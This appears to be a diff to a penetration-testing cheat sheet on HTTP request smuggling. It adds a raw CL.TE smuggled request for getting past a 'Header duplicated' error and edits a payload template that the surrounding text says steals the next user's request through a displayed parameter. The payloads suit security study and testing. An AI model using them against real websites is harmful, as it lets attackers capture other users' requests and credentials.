@@ -31,6 +31,24 @@ Transfer-Encoding: chunked
 STRING HERE
 ```
 
+If during the test you receive an "Header duplicated" error use the following request to override the header
+
+```
+POST / HTTP/1.1
+Host: <website>
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: <website>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=    #all headers set in the legitimate request end up as parameters in the body
+```
+
 #### TE.CL Exploit
 
 Front end uses `Transfer-Encoding` and back end uses `Content-Length`
@@ -128,7 +146,7 @@ POST <req> HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: <len>
-<req param>=
+<param>=
 ```
 
 For instance if the target request is like `/save?username=usr&msg=text` it is possible to steal the next user's request with the following payload and navigating to a point in the site where the msg parameter is displayed
